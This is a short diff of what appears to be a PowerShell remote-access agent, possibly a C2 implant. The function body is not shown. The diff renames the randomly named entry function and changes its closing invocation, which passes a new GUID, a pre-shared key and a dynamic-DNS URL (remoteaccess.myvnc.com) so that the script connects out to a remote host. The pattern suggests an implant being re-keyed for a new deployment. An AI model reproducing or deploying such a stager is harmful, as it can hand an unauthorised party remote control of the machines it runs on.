@@ -1,4 +1,4 @@
-function Invoke-LZAC6X
+function Invoke-JKSHVF
 {
     [CmdletBinding()]
     param (
@@ -790,4 +790,4 @@ else {
 
 }
 }
-Invoke-LZAC6X -Guid 'ae11688c-c4bb-499f-8929-a0b3d897d559' -Psk '3b8648c2174b4841f50a68bd6aa671d390fc49ad3a2525a758924034292344c7' -Url 'https://remoteaccess.myvnc.com:443'
+Invoke-JKSHVF -Guid '4fc9c9a9-9f65-41d7-9b76-1eb02788db70' -Psk '319bd09e8c74500950e2d325133058baa37f83041ac8e1141cab73b68ecc2dde' -Url 'https://remoteaccess.myvnc.com'
